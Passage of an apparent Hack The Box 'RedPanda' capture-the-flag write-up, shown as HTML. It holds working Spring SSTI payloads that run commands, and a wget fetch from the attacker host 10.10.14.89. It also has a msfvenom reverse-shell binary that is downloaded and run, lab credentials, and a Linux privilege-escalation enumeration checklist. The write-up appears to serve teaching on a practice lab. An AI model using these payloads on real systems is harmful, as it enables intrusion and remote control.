style="color:#f92672">))</span>.concat<span style="color:#f92672">(</span>T<span style="color:#f92672">(</span>java.lang.Character<span style="color:#f92672">)</span>.toString<span style="color:#f92672">(</span>115<span style="color:#f92672">))</span>.concat<span style="color:#f92672">(</span>T<span style="color:#f92672">(</span>java.lang.Character<span style="color:#f92672">)</span>.toString<span style="color:#f92672">(</span>115<span style="color:#f92672">))</span>.concat<span style="color:#f92672">(</span>T<span style="color:#f92672">(</span>java.lang.Character<span style="color:#f92672">)</span>.toString<span style="color:#f92672">(</span>119<span style="color:#f92672">))</span>.concat<span style="color:#f92672">(</span>T<span style="color:#f92672">(</span>java.lang.Character<span style="color:#f92672">)</span>.toString<span style="color:#f92672">(</span>100<span style="color:#f92672">)))</span>.getInputStream<span style="color:#f92672">())}</span></span></span></code></pre></div>
+    
+</div>
+<ul>
+<li>It works &amp; I can read the <code>/etc/passwd</code> file</li>
+<li><figure><img src="/ox-hugo/2025-01-03-172858_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="verifying-rce-via-ssti">Verifying RCE VIA SSTI:</h4>
+<ul>
+<li>
+<p>I the below commands.</p>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="*%7bT%28java.lang.Runtime%29.getRuntime%28%29.exec%28%22whoami%22%29%7d%0a*%7bT%28java.lang.Runtime%29.getRuntime%28%29.exec%28%22/bin/bash%20-c%20whoami%22%29%7d">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#f92672">*</span>{T(java.<span style="color:#a6e22e">lang</span>.<span style="color:#a6e22e">Runtime</span>).<span style="color:#a6e22e">getRuntime</span>().<span style="color:#a6e22e">exec</span>(<span style="color:#e6db74">&#34;whoami&#34;</span>)}
+</span></span><span style="display:flex;"><span><span style="color:#f92672">*</span>{T(java.<span style="color:#a6e22e">lang</span>.<span style="color:#a6e22e">Runtime</span>).<span style="color:#a6e22e">getRuntime</span>().<span style="color:#a6e22e">exec</span>(<span style="color:#e6db74">&#34;/bin/bash -c whoami&#34;</span>)}</span></span></code></pre></div>
+    
+</div>
+<ul>
+<li>I get this response:
+<ul>
+<li><figure><img src="/ox-hugo/2025-01-03-173948_.png">
+</figure>
+</li>
+<li>+Note+: This is the same for the most of the commands I try. This indicates the command is running but we are not being served the output.</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Making a request to my host</strong>:</p>
+<ul>
+<li>To verify my suspicions I spin up a python webserver:
+<ul>
+<li><code>python -m http.server 9000</code></li>
+<li>I then have the application reach out to the webserver to make a wget request.
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="#ZgotmplZ">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>  <span style="color:#f92672">*</span>{<span style="color:#e6db74">&#34;&#34;</span>.<span style="color:#a6e22e">getClass</span>().<span style="color:#a6e22e">forName</span>(<span style="color:#e6db74">&#34;java.lang.Runtime&#34;</span>).<span style="color:#a6e22e">getRuntime</span>().<span style="color:#a6e22e">exec</span>(<span style="color:#e6db74">&#34;wget http://10.10.14.89:9000/POC&#34;</span>)}</span></span></code></pre></div>
+    
+</div>
+</li>
+<li>Just as I thought it makes a request to my host.
+<ul>
+<li><figure><img src="/ox-hugo/2025-01-03-174832_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>+Note+: Now that I know the host is processing my commands and can make an outbound connection I can do the following:
+<ul>
+<li>Create a malicious binary.</li>
+<li>Download it to the host.</li>
+<li>Make the binary executable.</li>
+<li>Run it &amp; catch a reverse shell.</li>
+</ul>
+</li>
+<li>+Another Note+: If you&rsquo;re wondering &ldquo;why didn&rsquo;t you just try a reverse shell&rdquo; I did, but a standard bash shell or nc shell would not connect.</li>
+</ul>
+</li>
+</ul>
+<h3 id="getting-a-reverse-shell-via-ssti">Getting A Reverse Shell VIA SSTI:</h3>
+<h4 id="creating-a-malicious-dot-elf-binary">Creating A Malicious <code>.elf</code> binary:</h4>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="msfvenom%20-p%20linux/x64/shell_reverse_tcp%20LHOST=10.10.14.89%20LPORT=4242%20-f%20elf%20%3e%20rev.elf">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>msfvenom -p linux/x64/shell_reverse_tcp LHOST<span style="color:#f92672">=</span>10.10.14.89 LPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">4242</span> -f elf &gt; rev.elf</span></span></code></pre></div>
+    
+</div>
+<ul>
+<li><figure><img src="/ox-hugo/2025-01-03-175837_.png">
+</figure>
+</li>
+</ul>
+<h4 id="transferring-the-malicious-binary-to-the-host">Transferring The Malicious binary To The Host:</h4>
+<ul>
+<li>
+<p>I spin up my python web server again.</p>
+<ul>
+<li><code>python -m http.server 9000</code></li>
+</ul>
+</li>
+<li>
+<p>On the target I use wget to copy the file:</p>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="#ZgotmplZ">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>*<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;&#34;</span>.getClass<span style="color:#f92672">()</span>.forName<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;java.lang.Runtime&#34;</span><span style="color:#f92672">)</span>.getRuntime<span style="color:#f92672">()</span>.exec<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;wget http://10.10.14.89:9000/rev.elf&#34;</span><span style="color:#f92672">)}</span></span></span></code></pre></div>
+    
+</div>
+<ul>
+<li><figure><img src="/ox-hugo/2025-01-03-180127_.png">
+</figure>
+</li>
+<li>It transfers succesfully.</li>
+</ul>
+</li>
+</ul>
+<h4 id="making-the-malicious-binary-executable">Making The Malicious Binary Executable:</h4>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="*%7b%22%22.getClass%28%29.forName%28%22java.lang.Runtime%22%29.getRuntime%28%29.exec%28%22chmod%20777%20./rev.elf%22%29%7d">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>*<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;&#34;</span>.getClass<span style="color:#f92672">()</span>.forName<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;java.lang.Runtime&#34;</span><span style="color:#f92672">)</span>.getRuntime<span style="color:#f92672">()</span>.exec<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;chmod 777 ./rev.elf&#34;</span><span style="color:#f92672">)}</span></span></span></code></pre></div>
+    
+</div>
+<ul>
+<li>There is no feedback from this, I am running this blind.</li>
+</ul>
+<h4 id="executing-the-malicious-dot-elf-and-getting-a-shell">Executing The Malicious <code>.elf</code> &amp; Getting A Shell:</h4>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="*%7b%22%22.getClass%28%29.forName%28%22java.lang.Runtime%22%29.getRuntime%28%29.exec%28%22./rev.elf%22%29%7d">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>*<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;&#34;</span>.getClass<span style="color:#f92672">()</span>.forName<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;java.lang.Runtime&#34;</span><span style="color:#f92672">)</span>.getRuntime<span style="color:#f92672">()</span>.exec<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;./rev.elf&#34;</span><span style="color:#f92672">)}</span></span></span></code></pre></div>
+    
+</div>
+<ul>
+<li><figure><img src="/ox-hugo/2025-01-03-180247_.png">
+</figure>
+</li>
+<li>Shell caught</li>
+<li>I can see I am running as a user called <code>woodenk</code></li>
+</ul>
+<h4 id="upgrading-the-shell">Upgrading the shell:</h4>
+<ul>
+<li>As the shell appears to be low level I upgrade it using the tried and trusted python method.
+<ul>
+<li>I check if python is installed:
+<ul>
+<li><code>which python3</code></li>
+<li><figure><img src="/ox-hugo/2025-01-03-180613_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>I upgrade:
+<ul>
+<li><code>python3 -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'</code></li>
+<li>This effectively launches python 3, imports the pty module and then spawns a new <code>/bin/bash</code> shell giving me an interactive shell.</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="3-dot-enumerating-as-woodenk">3. Enumerating As woodenk:</h2>
+<ul>
+<li>First things first I will get the user flag.
+<ul>
+<li><figure><img src="/ox-hugo/2025-01-03-180851_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="enumerating-as-woodenk">Enumerating As woodenk:</h3>
+<ul>
+<li>
+<p>I check what groups the user is part of &amp; can see they have permissions to view logs:</p>
+<ul>
+<li><figure><img src="/ox-hugo/2025-01-03-181009_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p>I check if the user can write to any log files. I do this because if the user can write to a log file I may be able to use the logrotten exploit to escalate privileges.</p>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="find%20/%20-type%20f%20-name%20%22*.log%22%20-writable%202%3e/dev/null">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>find / -type f -name <span style="color:#e6db74">&#34;*.log&#34;</span> -writable 2&gt;/dev/null</span></span></code></pre></div>
+    
+</div>
+<ul>
+<li><figure><img src="/ox-hugo/2025-01-03-181429_.png">
+</figure>
+</li>
+<li>The user can write to: <code>/opt/panda_search/redpanda.log</code></li>
+<li>+Note+: I did pursue this but this but it did not work due there being no <code>GLIBC_2.34</code> on the host for the logrotten exploit to work.</li>
+</ul>
+</li>
+</ul>
+<h4 id="apache-maven">Apache-Maven:</h4>
+<ul>
+<li>I find an installation of apache maven in woodenk&rsquo;s home folder. Looking at his <code>.bashrc</code> file I see the below entries.
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="export%20MAVEN_HOME=%22/opt/maven%22%0aexport%20MAVEN_VERSION=3.8.3%0aexport%20MAVEN_CONFIG_HOME=%22/home/woodenk/.m2%22%0aexport%20JAVA_HOME=%22/usr/lib/jvm/java-11-openjdk-amd64/bin/java%22">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>export MAVEN_HOME<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/opt/maven&#34;</span>
+</span></span><span style="display:flex;"><span>export MAVEN_VERSION<span style="color:#f92672">=</span>3.8.3
+</span></span><span style="display:flex;"><span>export MAVEN_CONFIG_HOME<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/home/woodenk/.m2&#34;</span>
+</span></span><span style="display:flex;"><span>export JAVA_HOME<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/usr/lib/jvm/java-11-openjdk-amd64/bin/java&#34;</span></span></span></code></pre></div>
+    
+</div>
+</li>
+</ul>
+<h3 id="finding-hard-coded-credentials">Finding Hard Coded Credentials:</h3>
+<ul>
+<li>I run the following search to hunt for any files that feature the users &ldquo;woodenk&rdquo; name in them in the web root <code>/opt</code>
+<ul>
+<li>
+<p><code>grep /opt -rn -ie woodenk ; 2&gt;/dev/null</code></p>
+<ul>
+<li>It finds the below:
+<ul>
+<li><figure><img src="/ox-hugo/2025-01-07-130025_.png">
+</figure>
+</li>
+<li>This points to <code>panda_search/src/main/java/com/panda_search/htb/panda_search/MainController.java</code> line 106</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p>If we search the file, we find the below hard coded creds for the mysql service.</p>
+<ul>
+<li><figure><img src="/ox-hugo/2025-01-06-183810_.png">
+</figure>
+</li>
+<li><code>woodenk:RedPandazRule</code></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="accessing-the-host-via-ssh">Accessing The Host Via SSH:</h3>
+<ul>
+<li>
+<p>I check for password re-use on the SSH service and can access the host using the found credentials &amp; was able to login.</p>
+<ul>
+<li><figure><img src="/ox-hugo/2025-01-11-080311_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p>I re-ran linpeas as this user and did not find anything.</p>
+</li>
+</ul>
+<h2 id="4-dot-privilege-escalation">4. Privilege Escalation:</h2>
+<h3 id="manual-privilege-escalation-checks">Manual Privilege Escalation Checks:</h3>
+<ul>
+<li>
+<p>For full transparency I have done the following checks before moving onto looking at running processes in the next steps. If you just want to see what happens next, skip ahead.</p>
+<ul>
+<li>+Note+: Most of these are shown when executing linpeas, however I often find it easier to manually check if nothing obvious is presenting itself.</li>
+</ul>
+</li>
+<li>
+<p><strong>Check Kernel Version</strong>:</p>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="uname%20-a">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>uname -a</span></span></code></pre></div>
+    
+</div>
+</li>
+<li>
+<p><strong>Enumerate PATH</strong>:</p>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="echo%20$PATH">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>echo $PATH</span></span></code></pre></div>
+    
+</div>
+</li>
+<li>
+<p><strong>Enumerate enviromental variables</strong>:</p>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="env">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>env</span></span></code></pre></div>
+    
+</div>
+<ul>
+<li>Anything interesting in here PATH.</li>
+</ul>
+</li>
+<li>
+<p><strong>Enumerate available shells</strong>:</p>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="cat%20/etc/shells">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>cat /etc/shells</span></span></code></pre></div>
+    
+</div>
+<ul>
+<li>Are additional shells such as tmux/zshrc/fish etc available, if so are there configs for them? Read them.</li>
+</ul>
+</li>
+<li>
+<p><strong>Enumerate Sudo Version</strong>:</p>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="sudo%20-V">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>sudo -V</span></span></code></pre></div>
+    
+</div>
+</li>
+<li>
+<p><strong>Check Users Last Login Times</strong>:</p>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="lastlog">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>lastlog</span></span></code></pre></div>
+    
+</div>
+<ul>
+<li>This can give us an idea of how widely used this system is &amp; when it is used.</li>
+</ul>
+</li>
+<li>
+<p><strong>View who is currently logged in</strong>:</p>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="w">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>w</span></span></code></pre></div>
+    
+</div>
+</li>
+<li>
+<p><strong>View user home folder</strong>:</p>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="ls%20-la%20/home">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>ls -la /home</span></span></code></pre></div>
+    
+</div>
+</li>
+<li>
+<p><strong>View users bash history</strong>:</p>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="cat%20~/.bashrc~">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>cat ~/.bashrc~</span></span></code></pre></div>
+    
+</div>
+<ul>
+<li>Reviewing what the user has been doing can gives insight into the type of server and hints to privilege escalation paths.</li>
+</ul>
+</li>
+<li>
+<p><strong>Search for all history files</strong>:</p>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="find%20/%20-type%20f%20%5c%28%20-name%20*_hist%20-o%20-name%20*_history%20%5c%29%20-exec%20ls%20-l%20%7b%7d%20%5c;%202%3e/dev/null">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>find / -type f <span style="color:#ae81ff">\(</span> -name *_hist -o -name *_history <span style="color:#ae81ff">\)</span> -exec ls -l <span style="color:#f92672">{}</span> <span style="color:#ae81ff">\;</span> 2&gt;/dev/null</span></span></code></pre></div>
+    
+</div>
+</li>
+<li>
+<p><strong>View User Information</strong>:</p>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="#Always%20run%20a%20full%20cat%20/etc/passwd%20as%20embedded%20systems%20may%20have%20hard%20coded%20hashes%20in%20the%20file.%0acat%20/etc/passwd%0a#Lists%20all%20users%20/in%20etc/passwd%0acat%20/etc/passwd%20%7c%20cut%20-f1%20-d:">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#75715e">#Always run a full cat /etc/passwd as embedded systems may have hard coded hashes in the file.</span>
+</span></span><span style="display:flex;"><span>cat /etc/passwd
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#Lists all users /in etc/passwd</span>
+</span></span><span style="display:flex;"><span>cat /etc/passwd | cut -f1 -d:</span></span></code></pre></div>
+    
+</div>
+</li>
+<li>
+<p><strong>View User Information</strong>: Shows Group too.</p>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="id%20-nG">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>id -nG</span></span></code></pre></div>
+    
+</div>
+<ul>
+<li>This will show groups our user is a part of, ensure to check if they are part of any of these default groups:</li>
+</ul>
+</li>
+<li>
+<p><strong>View sudo privileges</strong>:</p>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="sudo%20-l">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>sudo -l</span></span></code></pre></div>
+    
+</div>
+</li>
+<li>
+<p><strong>View Group Information</strong>:</p>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="cat%20/etc/group">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>cat /etc/group</span></span></code></pre></div>
+    
+</div>
+</li>
+<li>
+<p><strong>Check which users have login shells</strong>: +do this!!!+</p>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="cat%20/etc/passwd%20%7c%20grep%20%22*sh$%22">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>cat /etc/passwd | grep <span style="color:#e6db74">&#34;*sh</span>$<span style="color:#e6db74">&#34;</span></span></span></code></pre></div>
+    
+</div>
+</li>
+<li>
+<p><strong>List tmux sessions</strong>:</p>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="tmux%20ls">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>tmux ls</span></span></code></pre></div>
+    
+</div>
+</li>
+<li>
+<p><strong>One liner to find all SUID (4000), SGID (1000) or both (6000)</strong>:</p>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="#%20Filters%20out%20snamp%20folders%0afind%20/%20%5c%28%20-type%20d%20-name%20%27*snap*%27%20-prune%20%5c%29%20-o%20%5c%28%20-type%20f%20%5c%28%20-perm%20-4000%20-o%20-perm%20-2000%20-o%20-perm%20-6000%20%5c%29%20-exec%20ls%20-ldb%20%7b%7d%20%5c;%20%5c%29%202%3e/dev/null%20%7c%20grep%20-v%20%22snap%22">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#75715e"># Filters out snamp folders</span>
+</span></span><span style="display:flex;"><span>find / <span style="color:#ae81ff">\(</span> -type d -name <span style="color:#e6db74">&#39;*snap*&#39;</span> -prune <span style="color:#ae81ff">\)</span> -o <span style="color:#ae81ff">\(</span> -type f <span style="color:#ae81ff">\(</span> -perm -4000 -o -perm -2000 -o -perm -6000 <span style="color:#ae81ff">\)</span> -exec ls -ldb <span style="color:#f92672">{}</span> <span style="color:#ae81ff">\;</span> <span style="color:#ae81ff">\)</span> 2&gt;/dev/null | grep -v <span style="color:#e6db74">&#34;snap&#34;</span></span></span></code></pre></div>
+    
+</div>
+</li>
+<li>
+<p><strong>Find Writable Files</strong>:</p>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="find%20/%20-path%20/proc%20-prune%20-o%20-type%20f%20-perm%20-o&#43;w%202%3e/dev/null">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>find / -path /proc -prune -o -type f -perm -o+w 2&gt;/dev/null</span></span></code></pre></div>
+    
+</div>
+</li>
+<li>
+<p><strong>Find all logfiles</strong>:</p>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="find%20/%20-type%20f%20-name%20%22*.log%22%202%3e/dev/null">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>find / -type f -name <span style="color:#e6db74">&#34;*.log&#34;</span> 2&gt;/dev/null</span></span></code></pre></div>
+    
+</div>
+<ul>
+<li>This did reveal: <code>/opt/panda_search/redpanda.log</code> but that was seen earlier.</li>
+</ul>
+</li>
+<li>
+<p><strong>Connections and Services</strong>:</p>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="netstat%20-antup">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>netstat -antup</span></span></code></pre></div>
+    
+</div>
+</li>
+</ul>
+<h3 id="checking-running-processes-with-pspy-and-finding-a-cron-job-running-as-root">Checking Running Processes With <a href="https://github.com/DominicBreuker/pspy">pspy</a> &amp; Finding A Cron Job Running As Root:</h3>
+<ul>
+<li>
+<p>I upload <a href="https://github.com/DominicBreuker/pspy">pspy</a> to check for running processes via a python webserver:</p>
+<ul>
+<li><code>python -m http.server 9000</code></li>
+</ul>
+</li>
+<li>
+<p>I use wget to copy it to the host:</p>
+<ul>
+<li><figure><img src="/ox-hugo/2025-01-11-074925_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p>Once launched with <code>./pspy64</code> I can see the following process is running:</p>
+<ul>
+<li><code>java -jar /opt/credit-score/LogParser/final/target/final-1.0-jar-with-dependencies.jar</code></li>
+<li><figure><img src="/ox-hugo/2025-01-11-081539_.png">
+</figure>
+</li>
+<li>Looking at the UID we can also see it&rsquo;s running as <code>root</code> as it&rsquo;s <code>UID 0</code></li>
+<li>I leave pspy running and it re-runs exactly 2 minutes later, so there is a cron job scheduled to run this.</li>
+<li>+Note+: There is also a shell script running <code>/root/run_credits.sh</code> however I currently have no way to read this so will focus on the java file.</li>
+</ul>
+</li>
+</ul>
+<h3 id="reading-the-source-code-of-app-dot-java">Reading The Source Code Of <code>app.java</code>:</h3>
+<ul>
+<li>I can read the source code of the <code>.jar</code> file being run by navigating to the project src folder in <code>/opt/credit-score/LogParser/final/src</code> looking further I can see the source code is the file <code>/opt/credit-score/LogParser/final/src/main/java/com/logparser/App.java</code></li>
+</ul>
+<h3 id="code-break-down">Code Break-Down:</h3>
+<p>I&rsquo;ll break down this Java code into chunks and explain what each part does.</p>
+<ul>
+<li>
+<p><strong>Package declarations and imports for file, image, and XML processing</strong>:</p>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
